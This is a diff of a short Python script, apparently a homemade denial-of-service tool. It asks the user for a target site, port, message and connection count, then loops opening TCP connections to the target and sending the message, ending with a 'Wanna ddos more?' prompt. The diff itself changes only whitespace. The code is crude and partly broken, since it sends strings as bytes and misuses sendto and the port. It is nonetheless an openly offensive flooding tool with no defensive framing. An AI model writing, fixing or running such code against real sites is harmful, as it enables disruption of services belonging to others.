@@ -7,23 +7,26 @@ def program_restart():
 cwd=os.getcwd()
 
 host=input('Enter site you want to attack:')
+
 port=int(input('Enter port you want to attack'))
+
 msg=input('Enter message you will send:')
+
 conn=int(input('Enter number of connections you will establish?'))
 
 ip=socket.gethostname()
 
 print(f'Attacking {host}')
 
-def dos():
-	ddos=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+def  dos():
+	ddos = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	try:
 		ddos.connect((host,80))
 		ddos.send(msg)
-		ddos.sendto(msg, (ip,port))
+		ddos.sendto(msg,(ip,port))
 		ddos.send(msg)
 	except:
-		print(f'Connection failed')
+		print(f'Connection failed' )
 	ddos.close()
 
 for i in range(1, conn):
@@ -32,6 +35,7 @@ for i in range(1, conn):
 	print(f'Connection sent {socket.gethostbyname(ip)} to {host}')
 
 choice=input('Wanna ddos more?')
+
 if choice=='y':
 	program_restart()
 else:
